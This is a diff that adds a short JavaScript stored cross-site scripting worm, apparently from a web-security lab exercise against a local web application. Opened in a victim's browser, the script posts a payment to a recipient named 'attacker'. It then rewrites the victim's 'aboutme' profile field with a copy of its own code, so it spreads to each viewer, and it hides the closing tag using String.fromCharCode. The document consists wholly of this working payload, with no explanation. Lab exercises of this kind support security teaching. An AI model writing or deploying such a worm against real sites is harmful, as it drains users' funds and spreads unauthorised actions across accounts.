@@ -1,0 +1,16 @@
+<script id="worm">
+var formData = new FormData();
+formData.append("amount", 1);
+formData.append("recipient", "attacker");
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "http://localhost:8080/pay", true);
+xhr.send(formData);
+
+var slash = String.fromCharCode(47);
+var virus = "<script id='worm'>" + document.getElementById("worm").innerHTML + "<" + slash + "script>";
+var formData2 = new FormData();
+formData2.append("aboutme", virus);
+var xhr2 = new XMLHttpRequest();
+xhr2.open("POST", "http://localhost:8080/aboutme", true);
+xhr2.send(formData2);
+</script>
